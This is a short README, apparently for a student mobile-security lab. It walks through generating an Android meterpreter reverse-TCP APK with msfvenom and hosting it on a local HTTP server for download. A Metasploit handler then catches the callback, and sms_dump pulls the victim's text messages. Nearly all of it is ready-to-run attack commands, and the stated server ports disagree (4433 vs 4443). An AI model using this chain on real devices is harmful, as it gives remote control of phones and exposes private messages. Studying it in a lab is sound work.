# 4MOCSecuMobile

## Generate APK

- msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=8888 -f raw -o name_apk.apk

## Server local

- python -m SimpleHTTPServer 4433
- To access it : your_ip:4443
- Put apk in folder or you started the server

## Metasploit

- Install metasploit
- Start it with msfconsole
- handler : use exploit/multi/handler
- Load payload : set payload android/meterpreter/reverse_tcp
- Configure Host + Port : set LHOST your_ip , set LPORT 8888
- Launch the payload : exploit
- sms_dump if exploit is a succesful.

## Emulator

- Start it
- Connect you to chrome
- Tap local server adress
- Click on APK and it should to donwload it
- It will have to dowload it

## Application

- tap in console make moveFile to move the txt if you have completed to generate the txt file
- Start the application and you will need to see the sms of the txt file


